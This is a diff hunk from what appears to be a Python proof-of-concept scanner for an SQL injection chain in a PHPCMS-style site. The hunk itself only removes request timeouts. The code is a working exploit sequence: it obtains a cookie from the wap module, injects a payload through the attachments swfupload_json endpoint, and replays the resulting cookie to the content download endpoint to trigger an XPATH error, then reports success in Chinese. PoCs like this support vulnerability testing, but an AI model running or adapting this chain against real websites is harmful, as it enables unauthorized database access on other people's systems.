@@ -42,18 +42,18 @@ class poc:
     def vuln(self, netloc, scheme):
         cookie_url = "{}://{}/index.php?m=wap&c=index&a=init&siteid=1".format(scheme, netloc)
         try:
-            result_cookie = requests.get(url=cookie_url, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
+            result_cookie = requests.get(url=cookie_url, headers=self.headers, verify=False, proxies=self.proxies)
             if result_cookie.status_code == 200:
                 cookie_post = result_cookie.cookies.values()[0]
                 vuln_url = "{}://{}/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src={}".format(scheme, netloc, quote(self.payload))
                 data = {
                     "userid_flash": cookie_post
                 }
-                vuln_result = requests.post(url=vuln_url, data=data, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
+                vuln_result = requests.post(url=vuln_url, data=data, headers=self.headers, verify=False, proxies=self.proxies)
                 if vuln_result.status_code == 200 and vuln_result.text == "":
                     vuln_cookie = re.search("json=(.*)", vuln_result.headers["Set-Cookie"]).group(1)
                     url = "{}://{}/index.php?m=content&c=down&a_k={}".format(scheme, netloc, vuln_cookie)
-                    result = requests.get(url=url, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
+                    result = requests.get(url=url, headers=self.headers, verify=False, proxies=self.proxies)
                     if "XPATH syntax error" in result.text:
                         target = urlparse(cookie_url)
                         self.result_text += """\n        [+]    \033[32m检测到目标站点存在SQL注入漏洞\033[0m
